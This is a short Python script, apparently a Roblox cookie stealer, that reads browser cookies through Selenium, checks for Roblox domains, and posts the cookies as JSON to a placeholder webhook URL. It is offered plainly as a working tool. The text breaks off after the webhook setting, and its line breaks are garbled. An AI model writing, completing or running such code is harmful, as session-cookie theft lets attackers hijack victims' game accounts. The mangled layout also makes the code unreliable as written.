import requests
import json
import os

def get_cookies(browser):    cookies = {}    for cookie in browser.get_cookies(None):        cookies[cookie.name] = cookie.value
    return cookies

def is_roblox_domain(url):    return"roblox" in url

def send_to_webhook(cookies, webhook_url):    requests.post(webhook_url, data=json.dumps(cookies), headers={'Content-Type': 'application/json'})# Main function
if __name__ == "__main__":    from selenium import webdriver

    # Replace with your desired webhook URL
    WEBHOOK_URL ="WEBHOOK_URL_HERE"    # Create a new Chrome browser instance (you can change this to other browsers like Firefox)
